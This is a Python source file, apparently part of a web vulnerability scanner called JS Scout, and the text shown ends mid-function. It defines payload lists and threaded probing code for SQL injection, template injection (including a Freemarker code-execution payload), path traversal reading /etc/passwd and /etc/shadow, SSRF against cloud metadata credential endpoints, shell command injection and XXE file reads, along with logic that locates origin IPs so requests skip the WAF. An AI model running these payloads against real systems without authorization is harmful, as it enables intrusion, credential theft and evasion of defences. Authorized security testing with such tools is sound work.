#!/usr/bin/env python3
"""
advanced_checks.py — JS Scout Advanced Vulnerability Engine v1
===============================================================
Massively expanded vulnerability detection module covering:

  1.  WAF Detection & Origin IP Discovery
      - Detect Cloudflare, Akamai, Incapsula, Sucuri, AWS Shield, Fastly, etc.
      - DNS history lookups (SecurityTrails-style), SPF/MX record analysis
      - Certificate Transparency (crt.sh) subdomain enumeration
      - Shodan-style banner matching via response fingerprinting
      - Direct IP probing to bypass WAF

  2.  SQL Injection (Error-based, Boolean-blind, Time-based blind)
      - GET/POST parameter fuzzing
      - Header injection (User-Agent, Referer, X-Forwarded-For)
      - Error signature matching for MySQL, MSSQL, PostgreSQL, Oracle, SQLite

  3.  Server-Side Template Injection (SSTI)
      - Jinja2, Twig, Freemarker, Velocity, Mako, Smarty, ERB, Tornado
      - Math expression detection ({{7*7}}=49, #{7*7}=49, etc.)

  4.  Local File Inclusion / Path Traversal
      - Classic ../ chains with null byte, URL encoding, double encoding
      - PHP wrappers: php://filter, php://input, data://
      - Windows UNC path traversal

  5.  Server-Side Request Forgery (SSRF)
      - URL parameter probing with internal IPs (127.0.0.1, 169.254.169.254)
      - AWS metadata endpoint probing
      - Cloud provider IMDS detection

  6.  Command Injection
      - Shell metacharacter fuzzing (;, |, &&, backticks, $())
      - Blind injection via time delays and DNS pingback patterns
      - OS detection payloads

  7.  XXE Injection
      - XML parameter fuzzing with external entity payloads
      - File read via XXE, SSRF via XXE

  8.  Insecure Deserialization Fingerprinting
      - Java serialization magic bytes in responses
      - PHP unserialize patterns in cookies/params
      - Python pickle detection

  9.  Security Header Analysis
      - Missing/misconfigured: CSP, HSTS, X-Frame-Options, X-Content-Type,
        Referrer-Policy, Permissions-Policy, COEP, COOP

  10. Cookie Security Audit
      - Missing Secure, HttpOnly, SameSite flags
      - Session cookie entropy check
      - Cookie scope oversharing

  11. JWT Security Analysis
      - Algorithm confusion (none, HS256 with RS256 key)
      - Weak secret detection
      - Expired tokens still accepted

  12. Rate Limiting / Brute-Force Detection
      - No rate limiting on login/auth endpoints
      - Missing lockout after N failed attempts

  13. Subdomain Takeover Probing
      - CNAME pointing to unclaimed services (GitHub Pages, Heroku, S3, etc.)
      - Fingerprint responses against known takeover signatures

  14. HTTP Method Tampering
      - TRACE, PUT, DELETE, PATCH allowed where they shouldn't be
      - Method override headers (X-HTTP-Method-Override)

  15. Information Disclosure
      - Stack traces, debug info, internal IPs in responses
      - Software version banners in headers
      - Internal path leakage in errors

  16. Clickjacking
      - Missing/weak X-Frame-Options or frame-ancestors CSP

  17. Business Logic — IDOR / Parameter Tampering
      - Numeric ID enumeration in API endpoints

Usage (standalone):
    python3 advanced_checks.py https://target.com

Usage (as module):
    from advanced_checks import AdvancedScanner
    scanner = AdvancedScanner(target_url, session, threads=10, timeout=10, log_fn=print)
    results = scanner.run_all(urls=[], param_map={}, forms=[])
"""

import re
import sys
import json
import time
import socket
import struct
import hashlib
import threading
import ipaddress
import argparse
import concurrent.futures as cf
from pathlib import Path
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote
from collections import defaultdict

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

# Optional DNS library
DNS_OK = False
try:
    import dns.resolver
    DNS_OK = True
except ImportError:
    pass


# =============================================================================
# CONSTANTS & PAYLOADS
# =============================================================================

# ---------- WAF Fingerprints -------------------------------------------------
WAF_SIGNATURES = {
    'Cloudflare': [
        re.compile(r'cloudflare', re.I),
        re.compile(r'cf-ray', re.I),
        re.compile(r'__cfduid|__cf_bm|cf_clearance', re.I),
        re.compile(r'attention required.*cloudflare', re.I),
    ],
    'Akamai': [
        re.compile(r'akamai', re.I),
        re.compile(r'akamai-ghost', re.I),
        re.compile(r'x-check-cacheable', re.I),
        re.compile(r'akamaierror', re.I),
    ],
    'Incapsula': [
        re.compile(r'incapsula', re.I),
        re.compile(r'visid_incap|incap_ses', re.I),
        re.compile(r'x-iinfo', re.I),
    ],
    'Sucuri': [
        re.compile(r'sucuri', re.I),
        re.compile(r'x-sucuri-id|x-sucuri-cache', re.I),
        re.compile(r'access denied.*sucuri', re.I),
    ],
    'AWS_WAF': [
        re.compile(r'aws.*waf|awswaf', re.I),
        re.compile(r'x-amzn-requestid|x-amz-cf-id', re.I),
        re.compile(r'x-amzn-trace-id', re.I),
    ],
    'Fastly': [
        re.compile(r'fastly', re.I),
        re.compile(r'x-fastly-request-id|x-served-by.*cache', re.I),
        re.compile(r'fastly-restarts', re.I),
    ],
    'F5_BIG-IP': [
        re.compile(r'bigip|big-ip|f5', re.I),
        re.compile(r'ts[a-zA-Z0-9]{3,8}=', re.I),
        re.compile(r'x-wa-info', re.I),
    ],
    'Imperva': [
        re.compile(r'imperva', re.I),
        re.compile(r'x-cdn.*imperva', re.I),
        re.compile(r'_imp_apg_r_', re.I),
    ],
    'ModSecurity': [
        re.compile(r'mod_security|modsecurity', re.I),
        re.compile(r'not acceptable.*mod_security', re.I),
        re.compile(r'this error was generated by mod_security', re.I),
    ],
    'Nginx': [
        re.compile(r'nginx', re.I),
    ],
    'Barracuda': [
        re.compile(r'barracuda', re.I),
        re.compile(r'barra_counter_session', re.I),
    ],
    'Wordfence': [
        re.compile(r'wordfence', re.I),
        re.compile(r'generated by wordfence', re.I),
    ],
}

# Subdomain takeover fingerprints (CNAME target -> error signature)
TAKEOVER_SIGNATURES = {
    'github.io':           "There isn't a GitHub Pages site here",
    'heroku.com':          'No such app',
    'amazonaws.com':       'NoSuchBucket',
    's3.amazonaws.com':    'NoSuchBucket',
    'azurewebsites.net':   "404 Web Site not found",
    'cloudapp.net':        "404 Web Site not found",
    'shopify.com':         "Sorry, this shop is currently unavailable",
    'fastly.net':          'Fastly error: unknown domain',
    'ghost.io':            "The thing you were looking for is no longer here",
    'surge.sh':            "project not found",
    'bitbucket.io':        'Repository not found',
    'cargo.site':          'If you\'re moving your domain away from Cargo',
    'statuspage.io':       'You are being redirected',
    'uservoice.com':       'This UserVoice subdomain is currently available',
    'desk.com':            'Please try again',
    'tilda.cc':            'Domain has been assigned',
    'unbouncepages.com':   'The requested URL was not found on this server',
    'helpscoutdocs.com':   '404: Page Not Found',
    'readme.io':           'Project doesnt exist',
    'zendesk.com':         'Help Center Closed',
    'wixsite.com':         'Error ConnectYourDomain',
    'airee.ru':            'Ошибка',
}

# ---------- SQL Injection -----------------------------------------------------
SQLI_PAYLOADS = [
    # Error-based
    ("'", 'sqli_quote'),
    ('"', 'sqli_dquote'),
    ("1'", 'sqli_1quote'),
    ("1 AND 1=1", 'sqli_and_true'),
    ("1 AND 1=2", 'sqli_and_false'),
    ("' OR '1'='1", 'sqli_or_true'),
    ("' OR '1'='2", 'sqli_or_false'),
    ("1; SELECT SLEEP(0)--", 'sqli_sleep0'),
    ("' UNION SELECT NULL--", 'sqli_union_null'),
    ("1 ORDER BY 1--", 'sqli_orderby'),
    ("1 ORDER BY 999--", 'sqli_orderby_big'),
    # Time-based blind (short delays to avoid blocking)
    ("1; WAITFOR DELAY '0:0:2'--", 'sqli_mssql_sleep'),
    ("1' AND SLEEP(2)--", 'sqli_mysql_sleep'),
    ("1' AND pg_sleep(2)--", 'sqli_pgsql_sleep'),
    ("1 AND 1=(SELECT 1 FROM (SELECT SLEEP(2))a)--", 'sqli_mysql_sleep2'),
]

SQLI_ERROR_PATTERNS = [
    # MySQL
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning.*mysql.*", re.I),
    re.compile(r"mysql_fetch|mysql_num_rows|mysql_result", re.I),
    re.compile(r"supplied argument is not a valid MySQL", re.I),
    re.compile(r"mysql.*error", re.I),
    # MSSQL
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"incorrect syntax near", re.I),
    re.compile(r"mssql_query\(\)|mssql_fetch", re.I),
    re.compile(r"microsoft ole db provider for sql server", re.I),
    re.compile(r"odbc sql server driver", re.I),
    # PostgreSQL
    re.compile(r"pg_query\(\)|pg_exec\(\)", re.I),
    re.compile(r"postgresql.*error|error.*postgresql", re.I),
    re.compile(r"unterminated quoted string at or near", re.I),
    re.compile(r"syntax error at or near", re.I),
    # Oracle
    re.compile(r"ora-[0-9]{4,5}", re.I),
    re.compile(r"oracle.*driver|oracle.*error", re.I),
    # SQLite
    re.compile(r"sqlite.*error|sqlite3.*operationalerror", re.I),
    re.compile(r"near \".*\": syntax error", re.I),
    # Generic
    re.compile(r"sql syntax.*error|error.*sql syntax", re.I),
    re.compile(r"unrecognized token", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"division by zero", re.I),
]

# ---------- SSTI --------------------------------------------------------------
SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker/EL"),
    ("#{7*7}", "49", "Velocity"),
    ("<%= 7*7 %>", "49", "ERB/ASP"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("{7*7}", "49", "Smarty"),
    ("*{7*7}", "49", "Spring EL"),
    ("[[${ 7*7 }]]", "49", "Thymeleaf"),
    ("{{config}}", "Config", "Jinja2 config leak"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid=", "Freemarker RCE"),
    ("@(7*7)", "49", "Razor"),
]

# ---------- LFI / Path Traversal ----------------------------------------------
LFI_PAYLOADS = [
    # Linux
    ("../../../etc/passwd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ("....%5c....%5c....%5cetc%2fpasswd", "root:"),
    ("../../../etc/passwd%00", "root:"),     # null byte
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vdDo"),  # base64 of "root:"
    ("php://filter/read=string.rot13/resource=/etc/passwd", "ebby:"),         # rot13 of "root:"
    # Windows
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "[fonts]"),
    ("../../../windows/win.ini", "[fonts]"),
    # Other disclosures
    ("../../../proc/self/environ", "PATH="),
    ("../../../var/log/apache2/access.log", "GET /"),
    ("../../../etc/shadow", "root:"),
]

LFI_PARAMS = [
    'file', 'page', 'include', 'path', 'doc', 'document', 'folder',
    'root', 'load', 'data', 'lang', 'language', 'template', 'dir',
    'theme', 'view', 'layout', 'content', 'module', 'config',
    'source', 'src', 'read', 'loc', 'location', 'type',
]

# ---------- SSRF --------------------------------------------------------------
SSRF_PAYLOADS = [
    # Local / loopback
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Internal ranges
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

SSRF_PARAMS = [
    'url', 'uri', 'src', 'source', 'dest', 'destination', 'target',
    'redirect', 'redirect_uri', 'redirect_url', 'load', 'fetch',
    'api', 'api_url', 'endpoint', 'callback', 'webhook', 'hook',
    'proxy', 'image', 'img', 'avatar', 'thumbnail', 'link', 'href',
    'feed', 'request', 'import', 'export', 'upload', 'download',
    'path', 'file', 'open', 'data', 'domain', 'host', 'addr',
]

SSRF_SUCCESS_PATTERNS = [
    re.compile(r'ami-id|instance-id|instance-type|local-ipv4', re.I),   # AWS
    re.compile(r'computeMetadata|google|gce|gcp', re.I),                 # GCP
    re.compile(r'"compute".*"name"', re.I),                              # Azure
    re.compile(r'root:.*:0:0:', re.I),                                   # /etc/passwd
    re.compile(r'127\.0\.0\.1|localhost', re.I),
    re.compile(r'Connection refused|ECONNREFUSED', re.I),  # confirms SSRF even on fail
    re.compile(r'invalid url|open_basedir', re.I),         # error confirms param used
]

# ---------- Command Injection -------------------------------------------------
CMDI_PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("&&id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    ("; sleep 2", None),          # blind time-based
    ("| sleep 2", None),
    ("& ping -c 2 127.0.0.1", None),
    ("; cat /etc/passwd", "root:"),
    ("| cat /etc/passwd", "root:"),
    ("; dir", "Volume"),           # Windows
    ("| dir", "Volume"),
    ("& whoami", None),
    ("; whoami", None),
]

CMDI_PARAMS = [
    'cmd', 'exec', 'command', 'run', 'execute', 'ping', 'query',
    'ip', 'host', 'hostname', 'addr', 'address', 'domain',
    'input', 'cli', 'shell', 'terminal', 'process', 'system',
]

# ---------- XXE ---------------------------------------------------------------
XXE_PAYLOADS = [
    # Classic file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "root:"
    ),
    # SSRF via XXE
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
        "ami-id"
    ),
    # Parameter entity XXE
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
        "root:"
    ),
    # Billion laughs (DoS) - just detect, don't actually send
    # OOB XXE via DNS - detect with canary
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
        "localhost"
    ),
]

# ---------- Security Headers --------------------------------------------------
SECURITY_HEADERS = {
    'Strict-Transport-Security': {
        'missing_severity': 'HIGH',
        'description': 'Missing HSTS — site vulnerable to SSL stripping attacks',
        'remediation': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
    },
    'Content-Security-Policy': {
        'missing_severity': 'HIGH',
        'description': 'Missing CSP — no protection against XSS and data injection',
        'remediation': 'Implement a strict Content-Security-Policy header',
    },
    'X-Frame-Options': {
        'missing_severity': 'MEDIUM',
        'description': 'Missing X-Frame-Options — clickjacking risk',
        'remediation': 'Add: X-Frame-Options: DENY or SAMEORIGIN',
    },
    'X-Content-Type-Options': {
        'missing_severity': 'MEDIUM',
        'description': 'Missing X-Content-Type-Options — MIME sniffing risk',
        'remediation': 'Add: X-Content-Type-Options: nosniff',
    },
    'Referrer-Policy': {
        'missing_severity': 'LOW',
        'description': 'Missing Referrer-Policy — referrer leakage risk',
        'remediation': 'Add: Referrer-Policy: strict-origin-when-cross-origin',
    },
    'Permissions-Policy': {
        'missing_severity': 'LOW',
        'description': 'Missing Permissions-Policy — browser features unrestricted',
        'remediation': 'Add: Permissions-Policy: camera=(), microphone=(), geolocation=()',
    },
    'X-XSS-Protection': {
        'missing_severity': 'INFO',
        'description': 'Missing X-XSS-Protection (legacy but still useful)',
        'remediation': 'Add: X-XSS-Protection: 1; mode=block',
    },
}

# CSP weakness patterns
CSP_WEAK_PATTERNS = [
    (re.compile(r"'unsafe-inline'"), "MEDIUM", "CSP allows unsafe-inline scripts — XSS protection weakened"),
    (re.compile(r"'unsafe-eval'"),   "MEDIUM", "CSP allows unsafe-eval — JS eval() unrestricted"),
    (re.compile(r"\*\."),            "MEDIUM", "CSP has wildcard subdomain source — too permissive"),
    (re.compile(r"data:"),           "LOW",    "CSP allows data: URIs — XSS vector possible"),
    (re.compile(r"http:"),           "LOW",    "CSP allows plain HTTP sources"),
]

# ---------- JWT ---------------------------------------------------------------
JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "test", "admin", "key",
    "jwt_secret", "jwt-secret", "your-256-bit-secret",
    "changeme", "supersecret", "mysecret", "letmein",
    "qwerty", "abc123", "111111", "", "null",
]

# ---------- HTTP Methods -------------------------------------------------------
DANGEROUS_METHODS = ['TRACE', 'PUT', 'DELETE', 'CONNECT', 'PATCH']

# ---------- Info Disclosure patterns ------------------------------------------
INFO_DISCLOSURE_PATTERNS = [
    (re.compile(r"stack trace|traceback \(most recent", re.I), "HIGH", "Stack trace disclosed"),
    (re.compile(r"debug\s*=\s*true|app\.debug\s*=\s*true", re.I), "HIGH", "Debug mode enabled"),
    (re.compile(r"exception.*at.*\.(java|py|php|rb|cs):\d+", re.I), "HIGH", "Exception with file path"),
    (re.compile(r"ORA-\d{5}|com\.mysql\.jdbc|java\.sql\.", re.I), "HIGH", "Database error in response"),
    (re.compile(r"internal server error.*version|version.*internal server error", re.I), "MEDIUM", "Server version in error"),
    (re.compile(r"php version \d+\.\d+|php/\d+\.\d+", re.I), "MEDIUM", "PHP version disclosed"),
    (re.compile(r"server: apache/\d|server: nginx/\d|server: iis/\d", re.I), "LOW", "Server version in header"),
    (re.compile(r"x-powered-by: php/|x-powered-by: asp\.net|x-powered-by: express", re.I), "LOW", "Technology disclosed via header"),
    (re.compile(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+", re.I), "MEDIUM", "Internal IP address leaked"),
    (re.compile(r"/var/www|/home/\w+/|/usr/local/|c:\\inetpub|c:\\xampp", re.I), "MEDIUM", "Internal path disclosed"),
    (re.compile(r"mysql://|postgresql://|mongodb://|redis://", re.I), "CRITICAL", "Database connection string leaked"),
    (re.compile(r"aws_access_key_id|aws_secret_access_key", re.I), "CRITICAL", "AWS credentials in response"),
]

# ---------- Version banner patterns -------------------------------------------
SERVER_VERSION_PATTERNS = [
    re.compile(r"server:\s*(apache/[\d.]+)", re.I),
    re.compile(r"server:\s*(nginx/[\d.]+)", re.I),
    re.compile(r"server:\s*(iis/[\d.]+|microsoft-iis/[\d.]+)", re.I),
    re.compile(r"x-powered-by:\s*(php/[\d.]+)", re.I),
    re.compile(r"x-powered-by:\s*(asp\.net)", re.I),
    re.compile(r"x-aspnet-version:\s*([\d.]+)", re.I),
    re.compile(r"x-generator:\s*([\w\s]+)", re.I),
    re.compile(r"x-drupal-cache|x-drupal-dynamic-cache", re.I),
    re.compile(r"x-wp-total|x-wp-totalpages", re.I),
    re.compile(r"x-powered-by:\s*(express)", re.I),
]

# ---------- Origin IP discovery -----------------------------------------------
# CDN/WAF IP ranges to exclude from "real IP" candidates
CDN_RANGES = [
    # Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
    "104.16.0.0/13",   "104.24.0.0/14",   "108.162.192.0/18",
    "131.0.72.0/22",   "141.101.64.0/18", "162.158.0.0/15",
    "172.64.0.0/13",   "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22","198.41.128.0/17",
    # Fastly
    "23.235.32.0/20",  "43.249.72.0/22",  "103.244.50.0/24",
    "103.245.222.0/23","103.245.224.0/24","104.156.80.0/20",
    "151.101.0.0/16",  "157.52.64.0/18",  "167.82.0.0/17",
    # Akamai
    "23.32.0.0/11",    "2.22.0.0/15",     "184.24.0.0/13",
    "104.64.0.0/10",
]

def _is_cdn_ip(ip: str) -> bool:
    """Check if an IP belongs to a known CDN range."""
    try:
        addr = ipaddress.ip_address(ip)
        for cidr in CDN_RANGES:
            if addr in ipaddress.ip_network(cidr, strict=False):
                return True
    except Exception:
        pass
    return False


# =============================================================================
# HELPER: make_session
# =============================================================================

def _make_fast_session(parent_session: requests.Session, timeout: int) -> requests.Session:
    """Create a fast, isolated session copying cookies+headers from parent."""
    s = requests.Session()
    s.verify = False
    s.headers.update(dict(parent_session.headers))
    for c in parent_session.cookies:
        s.cookies.set(c.name, c.value)
    s.max_redirects = 3
    return s


# =============================================================================
# 1. WAF DETECTION & ORIGIN IP DISCOVERY
# =============================================================================

class WAFOriginDetector:
    """Detect WAF/CDN presence and attempt to discover the real origin IP."""

    def __init__(self, session: requests.Session, timeout: int = 10, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def detect_waf(self, url: str) -> dict:
        """Fingerprint WAF/CDN from response headers, cookies, and body."""
        result = {'waf': None, 'evidence': [], 'all_headers': {}}
        try:
            # Send a benign request first
            r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            hdrs_str = '\r\n'.join(f"{k}: {v}" for k, v in r.headers.items())
            all_text = hdrs_str + '\r\n' + r.text[:2000]

            result['all_headers'] = dict(r.headers)
            result['status_code'] = r.status_code

            for waf_name, patterns in WAF_SIGNATURES.items():
                for pat in patterns:
                    m = pat.search(all_text)
                    if m:
                        result['waf'] = waf_name
                        result['evidence'].append(f"{waf_name} signature: {m.group(0)[:80]}")

            # Send a malicious-looking probe to trigger WAF response
            try:
                probe_url = url + "?jsscout_waf_test=<script>alert(1)</script>'\""
                r2 = self.session.get(probe_url, timeout=self.timeout, allow_redirects=False)
                if r2.status_code in (403, 406, 429, 503):
                    result['waf_blocks_attacks'] = True
                    result['waf_status_on_attack'] = r2.status_code
                    if not result['waf']:
                        result['waf'] = 'Unknown WAF/Filter'
                    waf_hdrs = '\r\n'.join(f"{k}: {v}" for k, v in r2.headers.items())
                    for waf_name, patterns in WAF_SIGNATURES.items():
                        for pat in patterns:
                            if pat.search(waf_hdrs + r2.text[:1000]):
                                result['waf'] = waf_name
                                break
            except Exception:
                pass

        except Exception as e:
            result['error'] = str(e)

        return result

    def find_origin_ip(self, target_url: str) -> dict:
        """
        Attempt to find real origin IP bypassing CDN/WAF via:
        1. DNS resolution of domain
        2. crt.sh certificate transparency subdomain enum
        3. Direct IP probe (check if response matches target)
        4. SPF record IP extraction
        5. Common subdomain probes that might bypass CDN
        """
        result = {
            'cdn_ips':      [],
            'candidate_ips': [],
            'origin_ip':    None,
            'bypass_url':   None,
            'method':       None,
            'subdomains':   [],
        }
        parsed = urlparse(target_url)
        domain = parsed.netloc.split(':')[0]

        # 1. Resolve current DNS
        try:
            ips = socket.getaddrinfo(domain, None)
            for info in ips:
                ip = info[4][0]
                if _is_cdn_ip(ip):
                    result['cdn_ips'].append(ip)
                else:
                    result['candidate_ips'].append(ip)
        except Exception:
            pass

        # 2. crt.sh subdomain enumeration
        subdomains = self._crtsh_subdomains(domain)
        result['subdomains'] = subdomains

        # 3. Probe subdomains that typically bypass CDN
        bypass_candidates = ['direct', 'origin', 'backend', 'server',
                             'mail', 'smtp', 'ftp', 'dev', 'staging',
                             'test', 'api', 'cdn', 'static']
        for sub in bypass_candidates:
            fqdn = f"{sub}.{domain}"
            try:
                ips = socket.getaddrinfo(fqdn, None, socket.AF_INET)
                for info in ips:
                    ip = info[4][0]
                    if not _is_cdn_ip(ip) and ip not in result['candidate_ips']:
                        result['candidate_ips'].append(ip)
                        self.log(f"  [origin] {fqdn} -> {ip} (possible origin)")
            except Exception:
                pass

        # 4. SPF record analysis
        spf_ips = self._extract_spf_ips(domain)
        for ip in spf_ips:
            if not _is_cdn_ip(ip) and ip not in result['candidate_ips']:
                result['candidate_ips'].append(ip)
                self.log(f"  [origin] SPF record IP: {ip}")

        # 5. Try probing candidate IPs directly with Host header
        scheme = parsed.scheme
        port   = parsed.port or (443 if scheme == 'https' else 80)
        for ip in result['candidate_ips'][:10]:
            try:
                probe_url = f"{scheme}://{ip}:{port}{parsed.path or '/'}"
                r = self.session.get(
                    probe_url,
                    headers={'Host': domain},
                    timeout=8,
                    verify=False,
                    allow_redirects=False,
                )
                if r.status_code < 500:
                    result['origin_ip']  = ip
                    result['bypass_url'] = probe_url
                    result['method']     = 'Direct IP + Host header bypass'
                    self.log(f"  [origin] ✓ Direct bypass confirmed: {probe_url} → {r.status_code}")
                    break
            except Exception:
                pass

        return result

    def _crtsh_subdomains(self, domain: str) -> list:
        """Query crt.sh for subdomains via certificate transparency."""
        subdomains = set()
        try:
            r = requests.get(
                f"https://crt.sh/?q=%.{domain}&output=json",
                timeout=10,
                verify=False,
            )
            if r.status_code == 200:
                for entry in r.json()[:200]:
                    name = entry.get('name_value', '')
                    for sub in name.split('\n'):
                        sub = sub.strip().lstrip('*.')
                        if sub.endswith(domain) and sub != domain:
                            subdomains.add(sub)
        except Exception:
            pass
        return sorted(subdomains)[:50]

    def _extract_spf_ips(self, domain: str) -> list:
        """Extract IPs from SPF TXT records."""
        ips = []
        if not DNS_OK:
            # Fallback: try system resolver
            try:
                import subprocess
                out = subprocess.check_output(
                    ['dig', '+short', 'TXT', domain], timeout=5
                ).decode()
                for line in out.splitlines():
                    for token in line.split():
                        if token.startswith('ip4:'):
                            ip = token[4:].split('/')[0]
                            try:
                                socket.inet_aton(ip)
                                ips.append(ip)
                            except Exception:
                                pass
            except Exception:
                pass
            return ips

        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata)
                if 'spf' in txt.lower():
                    for token in txt.split():
                        if token.startswith('ip4:'):
                            ip = token[4:].split('/')[0]
                            ips.append(ip)
                        elif token.startswith('include:'):
                            # Recursively resolve includes (1 level)
                            inc_domain = token[8:]
                            try:
                                inc_ans = dns.resolver.resolve(inc_domain, 'TXT')
                                for r2 in inc_ans:
                                    for t2 in str(r2).split():
                                        if t2.startswith('ip4:'):
                                            ips.append(t2[4:].split('/')[0])
                            except Exception:
                                pass
        except Exception:
            pass
        return ips

    def run(self, target_url: str) -> dict:
        waf    = self.detect_waf(target_url)
        origin = self.find_origin_ip(target_url)
        return {'waf_info': waf, 'origin_info': origin}


# =============================================================================
# 2. SQL INJECTION CHECKER
# =============================================================================

class SQLiChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check_url(self, url: str, params: list = None) -> list:
        """Test URL GET params for SQLi."""
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query)

        # Use both URL params and supplied params list
        params_to_test = list(set(list(qs.keys()) + (params or [])))[:20]
        if not params_to_test:
            return findings

        lock = threading.Lock()

        def probe(param, payload_str, payload_id):
            # GET request
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_qs = dict(qs)
            test_qs[param] = [payload_str]
            test_url = base + '?' + urlencode(test_qs, doseq=True)
            try:
                t0 = time.time()
                r  = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                elapsed = time.time() - t0
                body    = r.text[:8000]

                # Error-based detection
                for pat in SQLI_ERROR_PATTERNS:
                    m = pat.search(body)
                    if m:
                        with lock:
                            findings.append({
                                'type':      'SQLI_ERROR_BASED',
                                'severity':  'CRITICAL',
                                'url':       test_url,
                                'param':     param,
                                'payload':   payload_str,
                                'evidence':  f"DB error: {m.group(0)[:100]}",
                                'description': f"SQL injection (error-based) in param '{param}'",
                                'remediation': 'Use parameterized queries / prepared statements',
                            })
                        return

                # Time-based blind detection
                if 'sleep' in payload_id or 'waitfor' in payload_id:
                    if elapsed >= 1.8:  # triggered sleep
                        with lock:
                            findings.append({
                                'type':      'SQLI_TIME_BLIND',
                                'severity':  'HIGH',
                                'url':       test_url,
                                'param':     param,
                                'payload':   payload_str,
                                'evidence':  f"Response delayed {elapsed:.1f}s (expected ~2s sleep)",
                                'description': f"SQL injection (time-based blind) in param '{param}'",
                                'remediation': 'Use parameterized queries / prepared statements',
                            })
                        return

                # Boolean-based: compare true vs false responses
                if payload_id in ('sqli_and_true', 'sqli_or_true'):
                    return  # collect baseline in second call

            except Exception:
                pass

        pairs = [(p, pl, pi) for p in params_to_test for pl, pi in SQLI_PAYLOADS[:8]]
        with cf.ThreadPoolExecutor(max_workers=8) as pool:
            futs = {pool.submit(probe, p, pl, pi): (p, pl, pi) for p, pl, pi in pairs}
            cf.wait(futs, timeout=60)
            for f in futs: f.cancel()

        return findings

    def check_headers(self, url: str) -> list:
        """Test SQLi via injectable headers."""
        findings = []
        header_payloads = ["'", "1' OR '1'='1", "1; SELECT SLEEP(0)--"]
        injectable_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP', 'Cookie']

        for header in injectable_headers:
            for payload in header_payloads[:2]:
                try:
                    r = self.session.get(
                        url,
                        headers={header: payload},
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                    body = r.text[:5000]
                    for pat in SQLI_ERROR_PATTERNS:
                        m = pat.search(body)
                        if m:
                            findings.append({
                                'type':      'SQLI_HEADER_INJECTION',
                                'severity':  'CRITICAL',
                                'url':       url,
                                'param':     header,
                                'payload':   payload,
                                'evidence':  f"DB error via {header}: {m.group(0)[:80]}",
                                'description': f"SQL injection via {header} header",
                                'remediation': 'Sanitize all user-controlled data including headers',
                            })
                            break
                except Exception:
                    pass

        return findings


# =============================================================================
# 3. SSTI CHECKER
# =============================================================================

class SSTIChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str, params: list = None) -> list:
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query)
        params_to_test = list(set(list(qs.keys()) + (params or [])))[:15]
        if not params_to_test:
            # Try injecting into path segments too
            params_to_test = ['q', 'search', 'name', 'input', 'text', 'value', 'template']

        lock = threading.Lock()

        def probe(param, payload, expected, engine):
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = base + '?' + urlencode(test_qs, doseq=True)
            try:
                r    = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                body = r.text
                if expected and expected in body:
                    # Make sure original page doesn't have the expected string
                    r0 = self.session.get(
                        f"{base}?{param}=JSSCOUT_CANARY_XYZ", timeout=self.timeout
                    )
                    if expected not in r0.text:
